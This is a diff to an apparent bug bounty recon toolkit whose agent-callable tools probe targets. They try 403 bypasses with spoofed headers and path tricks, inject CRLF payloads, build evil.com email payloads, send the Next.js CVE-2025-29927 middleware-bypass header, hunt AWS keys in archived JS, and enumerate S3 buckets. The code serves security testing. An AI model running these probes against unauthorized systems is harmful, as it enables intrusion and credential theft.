@@ -1,6 +1,6 @@
 // dsh-bugbounty — keyless bug bounty recon & finding toolkit for DSH.
 // Zero-import pure ESM: no @deepseek-ai/* imports; global fetch/AbortController
-// only. Registers 51 `bb_*` tools (enum, probe, headers, tech, wayback, recon,
+// only. Registers 53 `bb_*` tools (enum, probe, headers, tech, wayback, recon,
 // checklist, source-audit, triage, actuator, js-secrets, 403-bypass, origin-ip,
 // crlf, swagger, s3, punycode, mass-assign, email-payloads, nextjs-cve,
 // ct-fresh-assets, wordpress, cache-deception, sqli-param-hunt, waf-fingerprint,
@@ -9,7 +9,7 @@
 // entra-tenant-probe, cache-key-probe, ratelimit-classify, nosqli-auth-probe, jwt-analyze, cloud-storage-scan,
 // psbdmp-search, dockerhub-search, dangling-cname, dns-wildcard-probe,
 // resurrected-endpoints, api-docs-diff, h1-intel,
-// idor-extract, idor-boundary-gen, idor-swap-probe)
+// idor-extract, idor-boundary-gen, idor-swap-probe, xss-probe, ssrf-probe)
 // plus methodology guidance at systemPrompt
 // order 115. Exports bbApi (neutral {name, execute} map) for reuse from other
 // hosts (e.g. the OpenCode adapter).
@@ -72,16 +72,26 @@ async function fetchRes(url, exec, { budget, redirect = "follow", headers = {} }
 
 /** Fetch a URL and read its full text (for API endpoints). */
 async function fetchText(url, exec, opts) {
-	const { res } = await fetchRes(url, exec, opts);
-	const text = await res.text();
-	return { res, text };
+	const b = withBudget(exec, (opts && opts.budget) || 30000);
+	try {
+		const res = await fetch(url, {
+			signal: b.signal,
+			redirect: (opts && opts.redirect) || "follow",
+			headers: { "user-agent": UA, accept: "*/*", ...(opts && opts.headers) }
+		});
+		const text = await res.text();
+		return { res, text };
+	} finally {
+		b.dispose();
+	}
 }
 
-/** Read at most `limit` bytes of a response body; tolerant of stream errors. */
-async function readLimited(res, limit) {
+/** Read at most `limit` bytes of a response body; tolerant of stream errors and stalls. */
+async function readLimited(res, limit, stallMs = 8000) {
 	if (!res || !res.body) return "";
+	const reader = res.body.getReader();
+	const stall = setTimeout(() => { try { reader.cancel().catch(() => {}); } catch { /* already closed */ } }, stallMs);
 	try {
-		const reader = res.body.getReader();
 		const chunks = [];
 		let total = 0;
 		for (;;) {
@@ -91,13 +101,15 @@ async function readLimited(res, limit) {
 			total += value.length;
 			if (total >= limit) break;
 		}
-		try { await reader.cancel(); } catch { /* stream may already be closed */ }
 		const buf = new Uint8Array(Math.min(total, limit));
 		let off = 0;
 		for (const c of chunks) { buf.set(c, off); off += c.length; }
 		return new TextDecoder().decode(buf);
 	} catch {
 		return "";
+	} finally {
+		clearTimeout(stall);
+		try { await reader.cancel(); } catch { /* stream may already be closed */ }
 	}
 }
 
@@ -2535,7 +2547,7 @@ async function spfTxt(domain, exec) {
 		const ips = spf
 			.split(/\s+/)
 			.filter((t) => /^(ip4|ip6):/.test(t))
-			.map((t) => t.split(":")[1]);
+			.map((t) => t.replace(/^ip[46]:/, ""));
 		const includes = spf
 			.split(/\s+/)
 			.filter((t) => /^include:/.test(t))
@@ -2545,11 +2557,50 @@ async function spfTxt(domain, exec) {
 		return { ips: [], includes: [], txts: [], error: shortErr(e) };
 	}
 }
+function hashText(s) {
+	let h = 5381;
+	for (let i = 0; i < s.length; i++) h = ((h << 5) + h + s.charCodeAt(i)) >>> 0;
+	return h;
+}
+function b64ToBytes(b64) {
+	if (typeof atob === "function") {
+		const bin = atob(String(b64).replace(/\s/g, ""));
+		const out = new Uint8Array(bin.length);
+		for (let i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
+		return out;
+	}
+	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+	const out = [];
+	let buffer = 0, bits = 0;
+	for (const c of String(b64).replace(/=+$/, "")) {
+		const idx = chars.indexOf(c);
+		if (idx < 0) continue;
+		buffer = (buffer << 6) | idx;
+		bits += 6;
+		if (bits >= 8) {
+			bits -= 8;
+			out.push((buffer >> bits) & 0xff);
+		}
+	}
+	return new Uint8Array(out);
+}
+function u16le(buf, o) { return buf[o] | (buf[o + 1] << 8); }
+function utf16leStr(buf, o, len) {
+	let s = "";
+	for (let i = 0; i + 1 < len; i += 2) s += String.fromCharCode(buf[o + i] | (buf[o + i + 1] << 8));
+	return s;
+}
+function hexBytes(buf, o, end) {
+	let s = "";
+	for (let i = o; i < end && i < buf.length; i++) s += buf[i].toString(16).padStart(2, "0");
+	return s;
+}
 const TITLE_RE = /<title[^>]*>([^<]{1,90})<\/title>/i;
-async function probeTitle(host, exec) {
+async function probeTitle(host, exec, hostHeader) {
+	const hdrs = hostHeader ? { host: hostHeader } : {};
 	for (const scheme of ["https://", "http://"]) {
 		try {
-			const { res } = await fetchRes(scheme + host + "/", exec, { budget: 8000, redirect: "manual" });
+			const { res } = await fetchRes(scheme + host + "/", exec, { budget: 8000, redirect: "manual", headers: hdrs });
 			const text = await readLimited(res, 4000);
 			const m = text.match(TITLE_RE);
 			return { host, scheme: scheme.slice(0, -3), status: res.status, ctype: res.headers.get("content-type") || "", title: m ? m[1].trim() : "" };
@@ -2559,11 +2610,11 @@ async function probeTitle(host, exec) {
 	}
 	return null;
 }
-async function fetchWithHeader(url, exec, headerName, headerValue) {
+async function fetchWithHeader(url, exec, headerName, headerValue, redirect = "follow") {
 	try {
 		const headers = { "user-agent": UA };
 		headers[headerName] = headerValue;
-		const { res } = await fetchRes(url, exec, { budget: 10000, headers });
+		const { res } = await fetchRes(url, exec, { budget: 6000, redirect, headers });
 		const body = await readLimited(res, 1200);
 		return { status: res.status, ctype: res.headers.get("content-type") || "", size: body.length, body };
 	} catch (e) {
@@ -2574,8 +2625,13 @@ const CACHE_HDRS = ["x-cache", "cf-cache-status", "age", "cache-control", "x-ver
 function cacheEvidence(res) {
 	const ev = [];
 	for (const h of CACHE_HDRS) {
-		const v = res.headers.get(h);
-		if (v) ev.push(h + ": " + v);
+		let v = "";
+		try { v = res.headers.get(h) || ""; } catch { v = ""; }
+		if (!v) continue;
+		const low = String(v).toLowerCase();
+		if (h === "cache-control" && /no-store|no-cache|private|max-age=0/.test(low)) continue;
+		if (h === "age" && !/^\d+$/.test(low)) continue;
+		ev.push(h + ": " + v);
 	}
 	return ev;
 }
@@ -2802,12 +2858,14 @@ const TOOLS = [
 				for (const row of rows.slice(1)) {
 					const original = String(row[1] || "");
 					const st = String(row[2] || "");
+					const mime = String(row[3] || "");
 					if (st && !/^[23]/.test(st)) continue;
+					if (/^(image|font|audio|video)/.test(mime)) continue;
 					if (!original || seen.has(original)) continue;
 					seen.add(original);
 					urls.push(original);
 					const reason = interestingReason(original);
-					if (reason && interesting.length < 200) interesting.push({ url: original, reason });
+					if (reason && interesting.length < 200) interesting.push({ url: original, reason: mime ? reason + " (" + mime + ")" : reason });
 				}
 				out.urls = urls.slice(0, limit);
 				out.count = urls.length;
@@ -3057,7 +3115,13 @@ const TOOLS = [
 		parameters: {
 			type: "object",
 			additionalProperties: false,
-			properties: {},
+			properties: {
+				pReal: { type: "number", description: "0-1: P(genuine bug, not design opinion / expected behavior)" },
+				pFeasible: { type: "number", description: "0-1: P(exploitation is feasible in practice)" },
+				pRepro: { type: "number", description: "0-1: P(reproducible on demand)" },
+				pNew: { type: "number", description: "0-1: P(new root cause, not a known/bypassed variant)" },
+				impact: { type: "number", description: "0-10: expected impact (confidentiality/integrity/availability/bounty)" }
+			},
 			required: []
 		},
 		output: {
@@ -3070,13 +3134,16 @@ const TOOLS = [
 					finding_classes: { type: "array", items: { type: "string" } },
 					sqlite_audit: { type: "array", items: { type: "string" } },
 					report_template: { type: "array", items: { type: "string" } },
+					score: { type: "number" },
+					verdict: { type: "string" },
+					note: { type: "string" },
 					count: { type: "integer" },
 					filtered: { type: "boolean" }
 				},
 				required: ["rubric", "verdicts", "status_flow", "finding_classes", "sqlite_audit", "report_template", "count", "filtered"]
 			},
 			render: (_args, v) => renderLines("⚖️ bb_triage — Rhat-scored bug triage", [
-				"score a candidate before reporting (bughunt bug-report template):",
+				v.score !== null && v.score !== undefined ? `computed Rhat score: ${v.score} -> ${v.verdict} ${v.note ? "(" + v.note + ")" : ""}` : "score a candidate before reporting (bughunt bug-report template):",
 				...v.rubric.map((x) => `  ${x}`),
 				`verdicts: ${v.verdicts.join(" | ")}`,
 				`status flow: ${v.status_flow.join(" -> ")}`,
@@ -3088,8 +3155,23 @@ const TOOLS = [
 		},
 		timeoutMs: 5000,
 		isConcurrencySafe: () => true,
-		async execute() {
-			return { ...TRIAGE, count: TRIAGE.rubric.length, filtered: false };
+		async execute(args) {
+			const s = {};
+			for (const k of ["pReal", "pFeasible", "pRepro", "pNew"]) {
+				const n = Number(args && args[k]);
+				s[k] = Number.isFinite(n) ? Math.min(1, Math.max(0, n)) : null;
+			}
+			const imp = Number(args && args.impact);
+			s.impact = Number.isFinite(imp) ? Math.min(10, Math.max(0, imp)) : null;
+			if (Object.values(s).some((v) => v === null)) {
+				return { ...TRIAGE, count: TRIAGE.rubric.length, filtered: false, score: null, verdict: null, note: "pass pReal/pFeasible/pRepro/pNew (0-1) and impact (0-10) for a computed Rhat verdict" };
+			}
+			// Rhat-style composite: confidence product x novelty x impact
+			const confidence = s.pReal * s.pFeasible * s.pRepro;
+			const novelty = 0.6 + 0.4 * s.pNew;
+			const score = Math.round(confidence * novelty * s.impact * 10) / 10;
+			const verdict = score >= 7.5 ? "REPORT" : score >= 4 ? "INVESTIGATE" : "DISCARD";
+			return { ...TRIAGE, count: TRIAGE.rubric.length, filtered: false, score, verdict, note: "Rhat = P(real)*P(feasible)*P(repro)*novelty*impact = " + score };
 		}
 	},
 {
@@ -3155,19 +3237,20 @@ const TOOLS = [
 						base.replace(/\/$/, "") + p,
 						exec,
 						"x-forwarded-for",
-						"127.0.0.1"
+						"127.0.0.1",
+						"manual"
 					);
 					out.checked++;
-					const hit = r.status >= 200 && r.status < 400 || r.status === 401 || r.status === 403;
+					// 3xx (SSO-login bounces, catchall redirects) are NOT actuator hits — no follow
+					const hit = (r.status >= 200 && r.status < 300) || r.status === 401 || r.status === 403;
 					let flag = "";
 					if (hit) {
-						flag = (r.status < 400 && highRe.test(path)) ? "high" : "found";
+						flag = (r.status < 300 && highRe.test(path)) ? "high" : "found";
 						if (flag === "high") out.highRisk.push(path);
 					}
 					if (hit) out.endpoints.push({ path, status: r.status, ctype: r.ctype, size: r.size, flag });
 				};
-				for (const p of paths) await probe(p);
-				await mapPool(mutations, 6, (p) => probe(p));
+				await mapPool([...paths, ...mutations], 8, (p) => probe(p));
 				out.endpoints.sort((a, b) => (a.flag === "high" ? -1 : 1) - (b.flag === "high" ? -1 : 1));
 			} catch (e) {
 				out.error = shortErr(e);
@@ -3212,7 +3295,7 @@ const TOOLS = [
 			const out = { domain: String(args.domain || ""), count: 0, urls: [], note: "" };
 			try {
 				const domain = normalizeDomain(args.domain);
-				const { urls, error } = await cdxUrls(domain, exec, { filterJs: true, cap: Math.min(parseInt(args.limit || 25, 10), 80) });
+				const { urls, error } = await cdxUrls(domain, exec, { filterJs: true, cap: Math.min(Math.max(Number(args.limit) || 25, 1), 80) });
 				if (error && !urls.length) out.note = "CDX error: " + error;
 				const patterns = [
 					{ name: "aws_key", re: /AKIA[0-9A-Z]{16}/g },
@@ -3222,14 +3305,14 @@ const TOOLS = [
 				];
 				await mapPool(urls, 4, async (u) => {
 					try {
-						const { res } = await fetchRes(u, exec, { budget: 45000 });
+						const { res } = await fetchRes(u, exec, { budget: 10000 });
 						const txt = await readLimited(res, 500_000);
 						out.count++;
 						const found = [];
 						for (const p of patterns) {
 							const m = (txt.match(p.re) || []).slice(0, 8);
 							if (m.length) {
-								found.push(p.name);
+								found.push(p.name + "=" + m[0].slice(0, 48));
 								break;
 							}
 						}
@@ -3287,7 +3370,7 @@ const TOOLS = [
 				const origin = u.origin;
 				const get = async (url, headers) => {
 					try {
-						const { res } = await fetchRes(url, exec, { budget: 10000, headers: headers || { "user-agent": UA } });
+						const { res } = await fetchRes(url, exec, { budget: 6000, headers: headers || { "user-agent": UA } });
 						await readLimited(res, 200);
 						return res.status;
 					} catch {
@@ -3296,9 +3379,9 @@ const TOOLS = [
 				};
 				out.baseline = await get(base);
 				const methods = ["POST", "PUT", "HEAD", "PATCH", "TRACE", "OPTIONS", "DELETE", "SEARCH", "PROPFIND"];
-				for (const m of methods) {
+				await mapPool(methods, 4, async (m) => {
 					try {
-						const b = withBudget(exec, 10000);
+						const b = withBudget(exec, 6000);
 						let status = 0;
 						try {
 							const r = await fetch(base, { method: m, signal: b.signal, redirect: "manual", headers: { "user-agent": UA, "x-forwarded-for": "127.0.0.1" } });
@@ -3311,7 +3394,7 @@ const TOOLS = [
 					} catch {
 						out.methods.push({ value: m, status: 0 });
 					}
-				}
+				});
 				const hdrTests = [
 					["x-original-url", path],
 					["x-rewrite-url", path],
@@ -3323,22 +3406,21 @@ const TOOLS = [
 					["x-host", host],
 					["referer", origin + "/"],
 				];
-				for (const [h, val] of hdrTests) {
+				await mapPool(hdrTests, 6, async ([h, val]) => {
 					const s = await get(base, { "user-agent": UA, [h]: val });
 					out.headers.push({ value: h + ": " + val, status: s });
-				}
+				});
 				const pathTests = [
 					path + "/", path + "//", path + "/.", path + "/./", path + "..;/", path + ";",
 					path + ";.js", "/" + path.replace(/^\//, "") + "/", "/" + encodeURI(path.replace(/^\//, "")), path + "%2e",
-					path + "%2f", path + "%00", path + "?", path + "?x=1", path + "#x", path + "..%2f",
+					path + "%2f", path + "%00", path + "?", path + "?x=1", path + "..%2f",
 					"/%2e%2e" + path, "/%252e%252e" + path, "/%c0%af" + path, path + ".json",
 				];
-				for (const p of pathTests) {
+				await mapPool(pathTests, 6, async (p) => {
 					const u2 = new URL(u.origin + p);
 					const s = await get(u2.toString());
 					out.paths.push({ value: p, status: s });
-				}
-				await mapPool(out.methods, 6, async () => {});
+				});
 				const interesting = (s) => s > 0 && s < 500 && s !== out.baseline;
 				for (const m of out.methods) if (interesting(m.status)) out.changes.push({ kind: "method", value: m.value, status: m.status });
 				for (const h of out.headers) if (interesting(h.status)) out.changes.push({ kind: "header", value: h.value, status: h.status });
@@ -3398,7 +3480,7 @@ const TOOLS = [
 				if (spf.error) out.note = "SPF error: " + spf.error;
 				if (otx.error) out.note += (out.note ? "; OTX error: " : "OTX error: ") + otx.error;
 				const candidates = out.spfIps.slice(0, 10);
-				const results = await mapPool(candidates, 4, (ip) => probeTitle(ip, exec));
+				const results = await mapPool(candidates, 4, (ip) => probeTitle(ip, exec, domain));
 				for (const r of results) if (r) out.probes.push({ host: r.host, status: r.status, title: r.title });
 			} catch (e) {
 				out.error = shortErr(e);
@@ -3453,33 +3535,36 @@ const TOOLS = [
 				const u = new URL(base);
 				const basePath = u.pathname.replace(/\/$/, "");
 				for (const [cr, hdr] of payloads) {
-					variants.push({ where: "path", payload: cr + hdr, url: base.replace(basePath, basePath + "/" + cr + hdr) });
+					const vPath = new URL(base);
+					vPath.pathname = basePath + "/" + cr + hdr;
+					variants.push({ where: "path", payload: cr + hdr, url: vPath.toString() });
 					if (u.search) {
 						variants.push({ where: "query", payload: cr + hdr, url: base + "&x=" + cr + hdr });
 					} else {
 						variants.push({ where: "query", payload: cr + hdr, url: base + "?x=" + cr + hdr });
 					}
 					if (hdr) {
-						variants.push({ where: "path-header", payload: cr + hdr, url: base.replace(basePath, basePath + cr + hdr) });
+						const vHdr = new URL(base);
+						vHdr.pathname = basePath + cr + hdr;
+						variants.push({ where: "path-header", payload: cr + hdr, url: vHdr.toString() });
 					}
 				}
 				const seen = new Set();
-				for (const v of variants) {
-					if (seen.has(v.url)) continue;
+				await mapPool(variants, 6, async (v) => {
+					if (seen.has(v.url)) return;
 					seen.add(v.url);
 					out.count++;
 					try {
-						const { res } = await fetchRes(v.url, exec, { budget: 10000 });
+						const { res } = await fetchRes(v.url, exec, { budget: 6000 });
 						await readLimited(res, 400);
 						const injected = [];
-						const sc = res.headers.get("set-cookie");
-						if (sc && /crlf=|coffinxp/.test(sc)) injected.push("Set-Cookie: " + sc);
+						for (const sc of safeCookies(res)) if (/crlf=|coffinxp/i.test(sc)) injected.push("Set-Cookie: " + sc.split(";")[0]);
 						if (res.headers.get("x-injected")) injected.push("X-Injected: " + res.headers.get("x-injected"));
 						if (injected.length) out.found.push({ where: v.where, payload: v.payload, header: injected.join(" | "), status: res.status });
 					} catch {
 						// skipped
 					}
-				}
+				});
 				out.found = out.found.slice(0, 20);
 			} catch (e) {
 				out.error = shortErr(e);
@@ -3503,7 +3588,7 @@ const TOOLS = [
 				type: "object",
 				properties: {
 					domain: { type: "string" },
-					endpoints: { type: "array", items: { type: "object", properties: { path: { type: "string" }, status: { type: "integer" }, ctype: { type: "string" }, size: { type: "integer" } }, required: ["path", "status", "ctype", "size"], additionalProperties: false } },
+					endpoints: { type: "array", items: { type: "object", properties: { path: { type: "string" }, status: { type: "integer" }, ctype: { type: "string" }, size: { type: "integer" }, spec: { type: "boolean" } }, required: ["path", "status", "ctype", "size", "spec"], additionalProperties: false } },
 					found: { type: "integer" },
 					note: { type: "string" }
 				},
@@ -3513,7 +3598,7 @@ const TOOLS = [
 				renderLines("bb_swagger_scan", [
 					"domain: " + v.domain,
 					"found " + v.found + " swagger/openapi docs",
-					...v.endpoints.map((e) => e.path + " -> " + e.status + " (" + (e.ctype || "-") + ", " + e.size + "B)"),
+					...v.endpoints.filter((e) => e.spec).map((e) => e.path + " -> " + e.status + " (" + (e.ctype || "-") + ", " + e.size + "B)"),
 					v.note ? "note: " + v.note : "",
 				])
 		},
@@ -3531,15 +3616,18 @@ const TOOLS = [
 				];
 				await mapPool(paths, 8, async (p) => {
 					try {
-						const { res } = await fetchRes("https://" + domain + p, exec, { budget: 12000 });
-						const body = await readLimited(res, 3000);
-						out.endpoints.push({ path: p, status: res.status, ctype: res.headers.get("content-type") || "", size: body.length });
+						const { res } = await fetchRes("https://" + domain + p, exec, { budget: 10000 });
+						const body = await readLimited(res, 6000);
+						const ctype = res.headers.get("content-type") || "";
+						const specish = res.status >= 200 && res.status < 300 &&
+							(/(swagger|openapi|"paths"|definitions|"components"|"swagger":\s*"2\.0")/i.test(body) || /(json|ya?ml)/i.test(ctype));
+						out.endpoints.push({ path: p, status: res.status, ctype, size: body.length, spec: specish });
 					} catch {
-						out.endpoints.push({ path: p, status: 0, ctype: "", size: 0 });
+						out.endpoints.push({ path: p, status: 0, ctype: "", size: 0, spec: false });
 					}
 				});
-				out.endpoints.sort((a, b) => a.status - b.status);
-				out.found = out.endpoints.filter((e) => e.status >= 200 && e.status < 400).length;
+				out.endpoints.sort((a, b) => (b.spec ? 1 : 0) - (a.spec ? 1 : 0) || a.status - b.status);
+				out.found = out.endpoints.filter((e) => e.spec).length;
 				if (!out.found) out.note = "No swagger endpoints found over https; retry over http or with /api prefixes.";
 			} catch (e) {
 				out.error = shortErr(e);
@@ -3591,23 +3679,26 @@ const TOOLS = [
 				];
 				await mapPool(names, 6, async (name) => {
 					const forms = ["https://" + name + ".s3.amazonaws.com/", "https://s3.amazonaws.com/" + name + "/"];
+					let merged = null;
 					for (const u of forms) {
 						try {
-							const { res } = await fetchRes(u, exec, { budget: 10000 });
+							const { res } = await fetchRes(u, exec, { budget: 5000 });
 							const body = await readLimited(res, 1500);
 							const listable = res.status === 200 && /<ListBucketResult/i.test(body);
-							const note = res.status === 404 ? (body.includes("NoSuchBucket") ? "nonexistent" : "404") : body.includes("AccessDenied") ? "exists-private" : "";
-							const found = out.buckets.find((b) => b.name === name);
-							if (found) {
-								if (listable) { found.listable = true; found.note = found.note || "listable"; }
+							const note = res.status === 404 ? (body.includes("NoSuchBucket") ? "nonexistent" : "404") : body.includes("AccessDenied") ? "exists-private" : "exists";
+							if (merged) {
+								if (listable) merged.listable = true;
+								if (note && merged.note !== "nonexistent") merged.note = merged.note || note;
 							} else {
-								out.buckets.push({ name, status: res.status, listable, note });
-								if (listable && !out.open.includes(name)) out.open.push(name);
+								merged = { name, status: res.status, listable, note };
 							}
-							break;
 						} catch {
-							// try next form
+							// individual form error — try the other form
 						}
+					}
+					if (merged) {
+						out.buckets.push(merged);
+						if (merged.listable && !out.open.includes(name)) out.open.push(name);
 					}
 				});
 				if (!out.buckets.length) out.buckets.push({ name: d, status: 0, listable: false, note: "all probes errored (network blocked?)" });
@@ -3655,7 +3746,7 @@ const TOOLS = [
 					return out;
 				}
 				const [localRaw, domainRaw] = email.split("@");
-				const cap = Math.min(parseInt(args.cap || 18, 10), 40);
+				const cap = Math.min(Math.max(Number(args.cap) || 18, 1), 40);
 				const localVariants = homographVariants(localRaw, cap);
 				const add = (em, note) => {
 					if (em !== email && !out.variants.some((v) => v.email === em)) out.variants.push({ email: em, note });
@@ -3782,7 +3873,7 @@ const TOOLS = [
 				const base = [
 					email, L + "@" + d, l.toUpperCase() + "@" + d,
 					l + "+tag@example.com", l + "+test@" + d,
-					l.split("").join(".") + "@" + d, (l.split("").join(".") + "@gmail.com").replace("..", "."),
+					l.split("").join(".") + "@" + d, (l.split("").join(".") + "@gmail.com").replace(/\.{2,}/g, "."),
 					'"' + l + ' " "@' + d, "\"" + l + " name\"@" + d,
 					l + "%00@evil.com", l + "%0d%0a@evil.com", l + "\r\n@evil.com",
 					l + "@example.com@evil.com", l + "@" + d + "@evil.com",
@@ -3842,11 +3933,11 @@ const TOOLS = [
 				const base = normalizeUrl(args.url);
 				const get = async (headers) => {
 					try {
-						const { res } = await fetchRes(base, exec, { budget: 12000, headers });
-						await readLimited(res, 600);
-						return { status: res.status, rewrite: res.headers.get("x-middleware-rewrite") || "" };
+						const { res } = await fetchRes(base, exec, { budget: 10000, headers });
+						const body = await readLimited(res, 4000);
+						return { status: res.status, rewrite: res.headers.get("x-middleware-rewrite") || "", body };
 					} catch {
-						return { status: 0, rewrite: "" };
+						return { status: 0, rewrite: "", body: "" };
 					}
 				};
 				const b = await get({ "user-agent": UA });
@@ -3854,8 +3945,11 @@ const TOOLS = [
 				out.rewriteHeader = b.rewrite;
 				const t = await get({ "user-agent": UA, "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware:middleware" });
 				out.withHeader = t.status;
+				const bodyDiffers = b.body && t.body && b.body !== t.body;
 				if (t.status === 200 && b.status >= 300 && b.status < 500) {
 					out.verdict = "LIKELY CVE-2025-29927 (bypass: " + b.status + " -> 200)";
+				} else if (b.status === 200 && t.status === 200 && bodyDiffers) {
+					out.verdict = "200 with header returns DIFFERENT content than 200 baseline — possible middleware-bypass serving protected content; verify the header-probe page shows admin-only data (common 200-vs-200 variant)";
 				} else if (b.status === 200 && b.status !== t.status && t.status !== 200) {
 					out.verdict = "response changes with middleware header; investigate manually";
 				} else if (t.status === 0) {
@@ -3921,9 +4015,10 @@ const TOOLS = [
 						if (!seen.has(name) || nb > seen.get(name)) seen.set(name, nb);
 					}
 				}
-				const all = [...seen.entries()].filter(([n]) => n.endsWith("." + domain));
+				const all = [...seen.entries()].filter(([n]) => n === domain || n.endsWith("." + domain));
 				out.count = rows.length;
-				out.oldest = all.length ? all.length - 1 : 0;
+				const dates = all.map(([, nb]) => Date.parse(nb)).filter((d) => Number.isFinite(d));
+				out.oldest = dates.length ? Math.min(...dates) : 0;
 				const sorted = all.sort((a, b) => (a[1] < b[1] ? 1 : -1)).slice(0, limit);
 				out.fresh = sorted.map(([name, firstSeen]) => ({ name, firstSeen: firstSeen.slice(0, 10) }));
 				if (!out.fresh.length) out.note = "No non-wildcard certs found; try the root domain or a wildcard scope.";
@@ -3984,7 +4079,7 @@ const TOOLS = [
 				];
 				await mapPool(probes, 8, async ([p, flag]) => {
 					try {
-						const { res } = await fetchRes(base + p, exec, { budget: 12000 });
+						const { res } = await fetchRes(base + p, exec, { budget: 7000 });
 						const body = await readLimited(res, 2500);
 						let f = "";
 						if (flag === "user-enum" && res.status >= 200 && res.status < 400 && /[{"'"](slug|name)["'"][: ]/.test(body)) {
@@ -3994,13 +4089,17 @@ const TOOLS = [
 							for (const n of names.slice(0, 8)) out.usernames.push(n.replace(/"name":"|"$/g, ""));
 							out.usernames = uniq(out.usernames.map((x) => x.replace(/^"slug":"|^"name":"|"$/g, "")));
 							f = "users-leaked";
-						} else if (flag && res.status >= 200 && res.status < 400) {
-							f = flag;
-							if (flag === "setup-wizard" && /setup|configure|install/i.test(body)) f = "setup-wizard-live";
 						} else if (flag === "user-enum" && res.status === 401) {
 							f = "rest-locked";
 						} else if (flag === "xmlrpc" && res.status >= 200 && res.status < 400 && /XML-RPC/i.test(body)) {
 							f = "xmlrpc-live";
+						} else if (flag === "registration-open") {
+							// register page exists on every WP site; flag only when the form is actually open
+							if (res.status === 200 && /<form/i.test(body) && !/registration (is )?closed|not currently accepting|disabled by an administrator/i.test(body)) f = "registration-open";
+						} else if (flag && res.status === 200 && !/^\s*<!doctype\s+html|<html/i.test(body)) {
+							// config/backup/dotfile hits must be real 200 non-HTML content, not 301-to-homepage / catchall pages
+							if (flag === "setup-wizard" && /setup|configure|install/i.test(body)) f = "setup-wizard-live";
+							else if (flag !== "setup-wizard") f = flag;
 						}
 						out.endpoints.push({ path: p, status: res.status, flag: f });
 					} catch {
@@ -4062,16 +4161,17 @@ const TOOLS = [
 					.filter((p) => /^\/(account|profile|dashboard|settings|user|admin|my-account|orders|billing|checkout|api\/|wallet|payment|cart|preferences)/i.test(p) && !/\.[a-z0-9]{2,5}$/i.test(p))
 					.slice(0, limit);
 				if (error && !sensitive.length) out.note = "CDX error: " + error;
-				const suffixes = ["/style.css", "/main.css", "/main.js", "/test.png?x=1", "/%60test.js", "/.css", ";.css", "/style.css?cb=1"];
+				const suffixes = ["/style.css", "/main.css", "/main.js", "/test.png?x=1", "/.css", ";.css"];
 				const seen = new Set();
 				await mapPool(sensitive, 6, async (p) => {
 					for (const s of suffixes) {
 						const u = "https://" + domain + p + s;
 						if (seen.has(u)) continue;
+						if (out.scanned >= 130) return;
 						seen.add(u);
 						out.scanned++;
 						try {
-							const { res } = await fetchRes(u, exec, { budget: 12000 });
+							const { res } = await fetchRes(u, exec, { budget: 5000 });
 							await readLimited(res, 800);
 							const ev = cacheEvidence(res);
 							if (ev.length) out.cacheable.push({ url: u, status: res.status, evidence: ev.slice(0, 4) });
@@ -4202,7 +4302,8 @@ const TOOLS = [
 					["Akamai", h("x-akamai-transformed") || h("akamai-grn") ? "x-akamai-*" : ""],
 					["Imperva", h("x-iinfo") ? "x-iinfo" : ""],
 					["F5 BIG-IP", /bigip|f5/i.test(h("server")) || h("x-cnection") ? "server/x-cnection" : ""],
-					["AWS (LB/WAF)", /amazons3|awselb|cloudfront/i.test(h("server")) || h("x-amzn-requestid") || h("x-amz-cf-id") ? "x-amzn-*" : ""],
+					["AWS LB/CDN (not WAF)", /amazons3|awselb|cloudfront/i.test(h("server")) ? "server: amazons3/awselb/cloudfront" : ""],
+					["AWS WAF", h("x-amzn-waf-action") || /awswaf|blocked by aws waf/i.test(body) ? "x-amzn-waf-action/body" : ""],
 					["Azure", h("x-ms-request-id") ? "x-ms-request-id" : ""],
 					["Sucuri/other", /sucuri/i.test(h("server")) ? "server" : ""],
 					["Incapsula", h("x-iinfo") && /incap/i.test(h("server")) ? "x-iinfo" : ""],
@@ -4210,7 +4311,7 @@ const TOOLS = [
 				];
 				for (const [waf, ev] of sigs) if (ev) out.detected.push({ waf, evidence: ev });
 				if (/cloudflare/i.test(h("server")) && !out.detected.length) out.detected.push({ waf: "Cloudflare", evidence: "server header" });
-				if (/nginx/i.test(h("server")) && !out.detected.length) out.detected.push({ waf: "plain nginx (no WAF signature)", evidence: "server: nginx" });
+				if (/nginx/i.test(h("server")) && !out.detected.length) out.pageNote = "server: nginx — no WAF signature matched (plain origin or WAF-less edge)";
 				const tamperMap = {
 					Cloudflare: "between, space2comment", Sucuri: "space2comment, randomcase",
 					Akamai: "charencode, randomcase", Imperva: "space2morehash, space2comment",
@@ -4218,7 +4319,7 @@ const TOOLS = [
 					"F5 BIG-IP": "greatest, space2comment",
 				};
 				for (const d of out.detected) if (tamperMap[d.waf]) out.hints.push(d.waf + " -> --tamper=" + tamperMap[d.waf]);
-				if (/access denied|blocked|challenge|verify you are human|sorry/i.test(body)) out.pageNote = "block/challenge page detected in body";
+				if (/access denied|blocked|challenge|verify you are human|sorry/i.test(body)) out.pageNote = (out.pageNote ? out.pageNote + "; " : "") + "block/challenge page detected in body";
 			} catch (e) {
 				out.error = shortErr(e);
 			}
@@ -4267,10 +4368,10 @@ const TOOLS = [
 					try {
 						let res;
 						if (method === "GET") {
-							const r = await fetchRes(base, exec, { budget: 8000, redirect: "manual", headers });
+							const r = await fetchRes(base, exec, { budget: 4000, redirect: "manual", headers });
 							res = r.res;
 						} else {
-							const b = withBudget(exec, 8000);
+							const b = withBudget(exec, 4000);
 							try {
 								res = await fetch(base, { method, signal: b.signal, redirect: "manual", headers: { "user-agent": UA, accept: "*/*", ...headers } });
 							} finally {
@@ -4281,16 +4382,20 @@ const TOOLS = [
 						const acao = res.headers.get("access-control-allow-origin") || "";
 						const acac = res.headers.get("access-control-allow-credentials") || "";
 						const vary = res.headers.get("vary") || "";
-						let reflected = acao !== "" && acao !== "*" && (acao === origin || (origin !== "null" && acao.includes(new URL(origin).hostname)));
+						let reflected = false;
+						if (acao !== "" && acao !== "*" && acao !== "null") {
+							if (acao === origin) reflected = true;
+							else if (origin !== "null") {
+								try { reflected = new URL(acao).hostname === new URL(origin).hostname; } catch { reflected = false; }
+							}
+						}
 						return { origin, method, status: res.status, acao, acac, vary, reflected };
 					} catch {
 						return { origin, method, status: 0, acao: "", acac: "", vary: "", reflected: false };
 					}
 				};
-				for (const origin of origins) {
-					out.origins_tests.push(await run("GET", origin));
